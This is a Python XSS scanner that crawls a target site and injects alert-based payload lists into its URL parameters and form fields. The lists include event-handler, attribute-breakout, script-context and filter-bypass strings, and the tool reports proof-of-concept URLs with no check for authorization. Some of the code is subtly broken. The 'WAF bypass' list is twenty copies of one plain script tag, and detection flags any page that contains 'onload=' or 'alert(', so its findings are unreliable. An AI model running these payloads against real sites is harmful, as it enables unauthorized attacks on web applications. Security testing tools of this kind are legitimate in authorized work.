#!/usr/bin/env python3
"""
Advanced XSS Scanner - Based on XSStrike, Dalfox, and Burp Suite methodologies
Author: AI Assistant
Version: 2.0
"""

import requests
import re
import urllib.parse
import time
import random
import string
import json
import threading
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from bs4 import BeautifulSoup
import argparse
from colorama import init, Fore, Style
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import hashlib

# Initialize colorama
init()

class AdvancedXSSScanner:
    def __init__(self, target_url, max_threads=5, delay=1, max_depth=2, timeout=10):
        self.target_url = target_url
        self.max_threads = max_threads
        self.delay = delay
        self.max_depth = max_depth
        self.timeout = timeout
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Data structures
        self.visited_urls = set()
        self.discovered_params = set()
        self.forms = []
        self.vulnerabilities = []
        self.lock = threading.Lock()
        
        # Payload sets based on research
        self.payloads = self._load_payloads()
        
    def log(self, message, level="INFO"):
        """Enhanced logging with colors"""
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.MAGENTA,
            "DEBUG": Fore.BLUE
        }
        timestamp = time.strftime("%H:%M:%S")
        print(f"{colors.get(level, Fore.WHITE)}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def _load_payloads(self):
        """Load comprehensive XSS payloads based on research"""
        return {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus><option>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '<isindex onfocus=alert("XSS") autofocus>',
                '<form><button formaction="javascript:alert(\'XSS\')">',
                '<object data="javascript:alert(\'XSS\')">',
                '<embed src="javascript:alert(\'XSS\')">',
                '<applet code="javascript:alert(\'XSS\')">',
                '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')" x="',
                "' onmouseover='alert(\"XSS\")' x='",
                '" onfocus="alert(\'XSS\')" autofocus="',
                "' onfocus='alert(\"XSS\")' autofocus='",
                '" onload="alert(\'XSS\')" x="',
                "' onload='alert(\"XSS\")' x='",
                '" onerror="alert(\'XSS\')" x="',
                "' onerror='alert(\"XSS\")' x='",
                '" onclick="alert(\'XSS\')" x="',
                "' onclick='alert(\"XSS\")' x='",
                '" onblur="alert(\'XSS\')" autofocus="',
                "' onblur='alert(\"XSS\")' autofocus='",
                '" onchange="alert(\'XSS\')" x="',
                "' onchange='alert(\"XSS\")' x='",
                '" onsubmit="alert(\'XSS\')" x="',
                "' onsubmit='alert(\"XSS\")' x='",
                '" onreset="alert(\'XSS\')" x="',
                "' onreset='alert(\"XSS\")' x='",
                '" onselect="alert(\'XSS\')" x="',
                "' onselect='alert(\"XSS\")' x='"
            ],
            'javascript': [
                '";alert("XSS");//',
                "';alert('XSS');//",
                '";alert(String.fromCharCode(88,83,83));//',
                "';alert(String.fromCharCode(88,83,83));//",
                '";alert(/XSS/);//',
                "';alert(/XSS/);//",
                '";alert`XSS`;//',
                "';alert`XSS`;//",
                '";eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41));//',
                "';eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41));//",
                '";window["alert"]("XSS");//',
                "';window['alert']('XSS');//",
                '";setTimeout("alert(\\"XSS\\")",0);//',
                "';setTimeout('alert(\\'XSS\\')',0);//",
                '";setInterval("alert(\\"XSS\\")",1000);//',
                "';setInterval('alert(\\'XSS\\')',1000);//",
                '";Function("alert(\\"XSS\\")")();//',
                "';Function('alert(\\'XSS\\')')();//",
                '";[].constructor.constructor("alert(\\"XSS\\")")();//',
                "';[].constructor.constructor('alert(\\'XSS\\')')();//"
            ],
            'filter_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>alert(/XSS/)</script>',
                '<script>alert`XSS`</script>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
                '<script>window["alert"]("XSS")</script>',
                '<script>setTimeout("alert(\\"XSS\\")",0)</script>',
                '<script>setInterval("alert(\\"XSS\\")",1000)</script>',
                '<script>Function("alert(\\"XSS\\")")()</script>',
                '<script>[].constructor.constructor("alert(\\"XSS\\")")()</script>',
                '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
                '<svg onload=alert(String.fromCharCode(88,83,83))>',
                '<iframe src="javascript:alert(String.fromCharCode(88,83,83))">',
                '<body onload=alert(String.fromCharCode(88,83,83))>',
                '<input onfocus=alert(String.fromCharCode(88,83,83)) autofocus>',
                '<select onfocus=alert(String.fromCharCode(88,83,83)) autofocus><option>',
                '<textarea onfocus=alert(String.fromCharCode(88,83,83)) autofocus>',
                '<keygen onfocus=alert(String.fromCharCode(88,83,83)) autofocus>',
                '<video><source onerror="alert(String.fromCharCode(88,83,83))">',
                '<audio src=x onerror=alert(String.fromCharCode(88,83,83))>'
            ],
            'waf_bypass': [
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>',
                '<script>alert("XSS")</script>'
            ]
        }
    
    def reconnaissance(self):
        """Phase 1: Comprehensive reconnaissance using requests only"""
        self.log("Starting Phase 1: Reconnaissance", "INFO")
        
        try:
            # Step 1: Initial target analysis
            self.log(f"Analyzing target: {self.target_url}", "INFO")
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            
            self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
            
            # Step 2: Extract basic information
            base_domain = urlparse(self.target_url).netloc
            self.log(f"Base domain: {base_domain}", "INFO")
            
            # Step 3: Crawl for discovery
            discovered_urls = self._crawl_target()
            self.log(f"Discovered {len(discovered_urls)} URLs", "SUCCESS")
            
            # Step 4: Extract parameters and forms
            all_params = set()
            all_forms = []
            
            for url in discovered_urls:
                try:
                    # Extract parameters
                    params = self._extract_parameters(url)
                    all_params.update(params.keys())
                    
                    # Extract forms
                    forms = self._extract_forms(url)
                    all_forms.extend(forms)
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    self.log(f"Error processing {url}: {str(e)}", "ERROR")
                    continue
            
            self.log(f"Total parameters found: {len(all_params)}", "INFO")
            self.log(f"Total forms found: {len(all_forms)}", "INFO")
            
            return {
                'urls': discovered_urls,
                'parameters': list(all_params),
                'forms': all_forms,
                'base_domain': base_domain
            }
            
        except Exception as e:
            self.log(f"Reconnaissance failed: {str(e)}", "ERROR")
            return None
    
    def _crawl_target(self):
        """Intelligent crawling with same-origin restriction"""
        self.log("Starting intelligent crawling", "INFO")
        
        urls_to_visit = [(self.target_url, 0)]
        discovered_urls = set()
        base_domain = urlparse(self.target_url).netloc
        
        while urls_to_visit:
            current_url, depth = urls_to_visit.pop(0)
            
            if (current_url in self.visited_urls or 
                depth > self.max_depth or 
                current_url in discovered_urls):
                continue
            
            self.visited_urls.add(current_url)
            discovered_urls.add(current_url)
            
            try:
                response = self.session.get(current_url, timeout=self.timeout)
                response.raise_for_status()
                
                # Extract links
                links = self._extract_links(response.text, current_url)
                
                # Filter and add new URLs
                for link in links:
                    parsed = urlparse(link)
                    if (parsed.scheme in ('http', 'https') and 
                        parsed.netloc == base_domain and
                        link not in discovered_urls and
                        not self._is_static_resource(link)):
                        urls_to_visit.append((link, depth + 1))
                
                time.sleep(self.delay)
                
            except Exception as e:
                self.log(f"Error crawling {current_url}: {str(e)}", "ERROR")
                continue
        
        return list(discovered_urls)
    
    def _is_static_resource(self, url):
        """Check if URL is a static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf', '.zip', '.rar']
        return any(url.lower().endswith(ext) for ext in static_extensions)
    
    def _extract_links(self, html_content, base_url):
        """Extract links from HTML content"""
        links = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            links.append(full_url)
        
        return links
    
    def _extract_parameters(self, url):
        """Extract parameters from URL"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return params
    
    def _extract_forms(self, url):
        """Extract forms from URL"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            response.raise_for_status()
            
            forms = []
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                # Extract input fields
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_data['inputs'].append(input_data)
                
                # Convert action to absolute URL
                if form_data['action']:
                    form_data['action'] = urljoin(url, form_data['action'])
                else:
                    form_data['action'] = url
                
                forms.append(form_data)
            
            return forms
            
        except Exception as e:
            self.log(f"Error extracting forms from {url}: {str(e)}", "ERROR")
            return []
    
    def _identify_context(self, param_value, html_content):
        """Identify reflection context for parameter"""
        contexts = []
        
        # HTML Context
        if re.search(r'<[^>]*' + re.escape(param_value) + r'[^>]*>', html_content, re.IGNORECASE):
            contexts.append('basic')
        
        # Attribute Context
        if re.search(r'=\s*["\']' + re.escape(param_value) + r'["\']', html_content, re.IGNORECASE):
            contexts.append('attribute')
        
        # JavaScript Context
        if re.search(r'<script[^>]*>.*' + re.escape(param_value) + r'.*</script>', html_content, re.IGNORECASE | re.DOTALL):
            contexts.append('javascript')
        
        return contexts if contexts else ['basic']
    
    def _test_payload(self, url, param_name, payload, method='GET'):
        """Test XSS payload against parameter"""
        try:
            if method.upper() == 'GET':
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=self.timeout)
            else:
                data = {param_name: payload}
                response = self.session.post(url, data=data, timeout=self.timeout)
            
            # Check for XSS indicators
            xss_indicators = [
                'alert(' in response.text,
                'alert("' in response.text,
                "alert('" in response.text,
                '<script>' in response.text.lower(),
                'onerror=' in response.text.lower(),
                'onload=' in response.text.lower(),
                'onclick=' in response.text.lower()
            ]
            
            if any(xss_indicators):
                return True, response.text
            
        except Exception as e:
            self.log(f"Error testing payload: {str(e)}", "ERROR")
        
        return False, ""
    
    def _scan_parameter(self, url, param_name, contexts):
        """Scan a single parameter for XSS"""
        self.log(f"Scanning parameter: {param_name}", "INFO")
        
        for context in contexts:
            self.log(f"Testing context: {context}", "DEBUG")
            payloads = self.payloads.get(context, self.payloads['basic'])
            
            for payload in payloads:
                success, response = self._test_payload(url, param_name, payload, 'GET')
                
                if success:
                    with self.lock:
                        vuln = {
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'context': context,
                            'method': 'GET',
                            'response_snippet': response[:500] if response else ""
                        }
                        self.vulnerabilities.append(vuln)
                        self.log(f"XSS FOUND! Parameter: {param_name}, Context: {context}", "VULN")
                        self.log(f"Payload: {payload}", "VULN")
                        return True
                
                time.sleep(self.delay)
        
        return False
    
    def _scan_form(self, form):
        """Scan a single form for XSS"""
        self.log(f"Scanning form: {form['action']}", "INFO")
        
        for input_field in form['inputs']:
            if input_field['name']:
                contexts = ['basic', 'attribute', 'javascript']
                
                for context in contexts:
                    payloads = self.payloads.get(context, self.payloads['basic'])
                    
                    for payload in payloads:
                        try:
                            # Prepare form data
                            form_data = {}
                            for field in form['inputs']:
                                if field['name'] == input_field['name']:
                                    form_data[field['name']] = payload
                                else:
                                    form_data[field['name']] = field['value']
                            
                            if form['method'] == 'POST':
                                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
                            
                            # Check for XSS indicators
                            xss_indicators = [
                                'alert(' in response.text,
                                'alert("' in response.text,
                                "alert('" in response.text,
                                '<script>' in response.text.lower(),
                                'onerror=' in response.text.lower(),
                                'onload=' in response.text.lower(),
                                'onclick=' in response.text.lower()
                            ]
                            
                            if any(xss_indicators):
                                with self.lock:
                                    vuln = {
                                        'url': form['action'],
                                        'parameter': input_field['name'],
                                        'payload': payload,
                                        'context': context,
                                        'method': form['method'],
                                        'response_snippet': response.text[:500]
                                    }
                                    self.vulnerabilities.append(vuln)
                                    self.log(f"XSS FOUND! Form: {form['action']}, Field: {input_field['name']}", "VULN")
                                    self.log(f"Payload: {payload}", "VULN")
                                    return True
                                    
                        except Exception as e:
                            self.log(f"Error testing form: {str(e)}", "ERROR")
                        
                        time.sleep(self.delay)
        
        return False
    
    def scan(self):
        """Phase 2: XSS scanning"""
        self.log("Starting Phase 2: XSS Scanning", "INFO")
        
        # Get reconnaissance data
        recon_data = self.reconnaissance()
        if not recon_data:
            self.log("Reconnaissance failed, aborting scan", "ERROR")
            return
        
        # Scan discovered URLs
        urls_to_scan = recon_data['urls']
        self.log(f"Scanning {len(urls_to_scan)} URLs", "INFO")
        
        for url in urls_to_scan:
            try:
                # Scan URL parameters
                url_params = self._extract_parameters(url)
                if url_params:
                    self.log(f"Scanning parameters for {url}", "INFO")
                    for param_name in url_params:
                        contexts = ['basic', 'attribute', 'javascript', 'filter_bypass']
                        self._scan_parameter(url, param_name, contexts)
                
                # Scan forms on this URL
                forms = self._extract_forms(url)
                for form in forms:
                    self._scan_form(form)
                    
            except Exception as e:
                self.log(f"Error scanning {url}: {str(e)}", "ERROR")
                continue
        
        # Show results
        self._show_results()
    
    def _show_results(self):
        """Display scan results"""
        self.log("=" * 60, "INFO")
        self.log("XSS SCAN RESULTS", "INFO")
        self.log("=" * 60, "INFO")
        
        if not self.vulnerabilities:
            self.log("No XSS vulnerabilities found", "WARNING")
            return
        
        self.log(f"Total findings: {len(self.vulnerabilities)}", "SUCCESS")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            self.log(f"\n--- Vulnerability {i} ---", "VULN")
            self.log(f"URL: {vuln['url']}", "VULN")
            self.log(f"Parameter: {vuln['parameter']}", "VULN")
            self.log(f"Context: {vuln['context']}", "VULN")
            self.log(f"Method: {vuln['method']}", "VULN")
            self.log(f"Payload: {vuln['payload']}", "VULN")
            
            # Generate POC URL
            try:
                parsed = urlparse(vuln['url'])
                query = parse_qs(parsed.query)
                query[vuln['parameter']] = [vuln['payload']]
                new_query = urllib.parse.urlencode(query, doseq=True, safe='/:?&=')
                poc_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                self.log(f"POC: {poc_url}", "VULN")
            except Exception:
                self.log(f"POC: {vuln['url']}?{vuln['parameter']}={urllib.parse.quote(vuln['payload'])}", "VULN")
        
        # Save results
        self._save_results()
    
    def _save_results(self):
        """Save results to JSON file"""
        try:
            with open('xss_scan_results.json', 'w', encoding='utf-8') as f:
                json.dump(self.vulnerabilities, f, ensure_ascii=False, indent=2)
            self.log("Results saved to xss_scan_results.json", "SUCCESS")
        except Exception as e:
            self.log(f"Error saving results: {str(e)}", "ERROR")

def main():
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner - Based on XSStrike, Dalfox methodologies')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('-d', '--delay', type=float, default=1, help='Delay between requests in seconds (default: 1)')
    parser.add_argument('--depth', type=int, default=2, help='Crawling depth (default: 2)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    scanner = AdvancedXSSScanner(
        args.url,
        args.threads,
        args.delay,
        args.depth,
        args.timeout
    )
    
    scanner.scan()

if __name__ == "__main__":
    main()